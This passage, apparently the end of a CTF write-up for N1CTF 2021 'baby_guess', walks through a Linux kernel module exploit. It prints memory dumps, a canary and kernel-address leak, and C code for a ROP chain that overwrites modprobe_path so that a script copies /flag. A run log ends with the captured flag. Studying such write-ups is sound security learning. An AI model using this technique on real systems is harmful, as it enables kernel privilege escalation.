+<p>When the race is won, the encryption function in <code class="language-plaintext highlighter-rouge">setsockopts</code> will copy <code class="language-plaintext highlighter-rouge">0x200</code> bytes from our buffer into the device buffer (and xor the first <code class="language-plaintext highlighter-rouge">0x100</code> bytes of it). We can check, if the race was successful, since <code class="language-plaintext highlighter-rouge">setsockopt</code> will return <code class="language-plaintext highlighter-rouge">0x200</code> if so (<code class="language-plaintext highlighter-rouge">0x100</code> if we missed it).</p>
+
+<p>We’ll now just increment the byte at offset <code class="language-plaintext highlighter-rouge">0x100</code> and call the compare method of the module with size <code class="language-plaintext highlighter-rouge">0x101</code>. As soon as it succeeds, we know, that we guessed a correct byte, increase the offset and continue.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0xffffc9000037fc48:	0x0000000000000000	0x0000000000000000 &lt;= k_buffer
+0xffffc9000037fc58:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fc68:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fc78:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fc88:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fc98:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fca8:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fcb8:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fcc8:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fcd8:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fce8:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fcf8:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fd08:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fd18:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fd28:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fd38:	0x0000000000000000	0x0000000000000000
+0xffffc9000037fd48:	0xa51eca922ddb5500	0xffffc9000037fdc0 &lt;= stack guard / module leak
+0xffffc9000037fd58:	0xffffffff81902b1d	0x0000000000000002 &lt;= kernel address
+0xffffc9000037fd68:	0xffff88801df5b6a0	0xffff88801d1c3e00
+0xffffc9000037fd78:	0xffff88801d1c3e10	0x000000000000001a</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[+] Leak magic key
+[+] Start size overwrite thread
+[+] Leak kernel addresses
+CANARY      : 0xa51eca922ddb5500
+MODULE      : 0xffffc9000037fdc0
+KERNEL      : 0xffffffff81902b1d
+KERNEL BASE : 0xffffffff81000000</code></pre></figure>
+
+<h1 id="rop-to-overwrite-modprobe_path">rop to overwrite modprobe_path</h1>
+
+<p>With all the needed leaks, we can now get back to option <code class="language-plaintext highlighter-rouge">0x1338</code> for overflowing kernel stack and trigger a ropchain.</p>
+
+<p>After doing a quick test, to see that <code class="language-plaintext highlighter-rouge">modprobe_path</code> exploit would work in this challenge, I just did a simple ropchain for overwriting <code class="language-plaintext highlighter-rouge">modprobe_path</code> (and let it crash afterwards…)</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/cp /flag /tmp/flag</span><span class="se">\n</span><span class="s">/bin/chmod 777 /tmp/flag' &gt; /tmp/c"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/c"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"echo -ne '</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff' &gt; /tmp/dummy"</span><span class="p">);</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"chmod +x /tmp/dummy"</span><span class="p">);</span>
+
+<span class="p">...</span>
+
+<span class="c1">// mov qword ptr [rdi], rsi; ret;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">movrdirsi</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x1f50d6</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">poprdi</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x8cbc0</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">poprsi</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x33a7de</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">modprobe_path</span> <span class="o">=</span> <span class="n">kbase</span> <span class="o">+</span> <span class="mh">0x165ecc0</span><span class="p">;</span>
+
+<span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span> <span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">payload</span><span class="o">+</span><span class="mh">0x100</span><span class="p">);</span>
+
+<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+
+<span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)(</span><span class="n">payload</span><span class="o">+</span><span class="mi">272</span><span class="p">);</span>
+
+<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">poprdi</span><span class="p">;</span>
+<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">modprobe_path</span><span class="p">;</span>
+<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">poprsi</span><span class="p">;</span>
+<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x0000632f706d742f</span><span class="p">;</span>      <span class="c1">// /tmp/c</span>
+<span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">movrdirsi</span><span class="p">;</span>
+
+<span class="c1">// send compare request to trigger stack overflow</span>
+<span class="n">send_compare_req</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x1338</span><span class="p">,</span> <span class="mh">0x180</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">payload</span><span class="p">);</span></code></pre></figure>
+
+<p>Obviously the ropchain will crash after it copied <code class="language-plaintext highlighter-rouge">/tmp/c</code> to <code class="language-plaintext highlighter-rouge">modprobe_path</code>, but it will just kill our exploit process and get us back to the prompt (while <code class="language-plaintext highlighter-rouge">modprobe_path</code> will still be overwritten).</p>
+
+<p>From here, we can then trigger modprobe via <code class="language-plaintext highlighter-rouge">dummy</code> to copy the flag into <code class="language-plaintext highlighter-rouge">tmp</code> and make it readable.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] Compile
+[+] Opening connection to 43.129.169.75 on port 9999: Done
+[*] Booting
+[+] Upload: Done
+[*] Switching to interactive mode
+$ ./pwn
+[+] Leak magic key
+[+] Start size overwrite thread
+[+] Leak kernel addresses
+CANARY      : 0x11b1f8b6036fee00
+MODULE      : 0xffffb770c0377dc0
+KERNEL      : 0xffffffffb6502b1d
+KERNEL BASE : 0xffffffffb5c00000
+[   44.196900] No Overflow
+[   44.198653] BUG: kernel NULL pointer dereference, address: 0000000000000000
+[   44.200969] #PF: supervisor instruction fetch in kernel mode
+[   44.201149] #PF: error_code(0x0010) - not-present page
+[   44.201352] PGD 800000001e4ef067 P4D 800000001e4ef067 PUD 1e57f067 PMD 0 
+[   44.201714] Oops: 0010 [#1] SMP PTI
+[   44.201993] CPU: 5 PID: 181 Comm: pwn Tainted: G           OE     5.4.142 #2
+[   44.202194] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
+[   44.202847] RIP: 0010:0x0
+[   44.203128] Code: Bad RIP value.
+[   44.203257] RSP: 0018:ffffb770c0377d88 EFLAGS: 00000246
+[   44.203441] RAX: 0000000000000000 RBX: 0000000013371002 RCX: 0000000000000000
+[   44.203633] RDX: 0000000000000100 RSI: 0000632f706d742f RDI: ffffffffb725ecc0
+[   44.203822] RBP: 0000000000000000 R08: 0000000000000000 R09: 0000000000000000
+[   44.204012] R10: 0000000000000000 R11: 0000000000000000 R12: 00007ffc5e8ac760
+
+[SNIP]
+
+[   44.220387] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   44.220536] CR2: ffffffffffffffd6 CR3: 000000001cc02000 CR4: 00000000003006e0
+Killed
+
+/tmp $ $ ./dummy
+./dummy: line 1: \xff\xff\xff\xff: not found
+/tmp $ $ ls
+c        dummy    flag     pwn      pwn.b64
+/tmp $ $ cat flag
+
+n1ctf{69c22bc1-8883-42dd-b830-308affd3aa12}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=N1CTF 2021 - baby_guess&amp;url=https://kileak.github.io/ctf/2021/n1ctf21-babyguess/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/n1ctf21-babyguess/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2021/n1ctf21-babyguess';
+        var disqus_title = 'N1CTF 2021 - baby_guess';
+        var disqus_url = 'https://kileak.github.io/ctf/2021/n1ctf21-babyguess';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
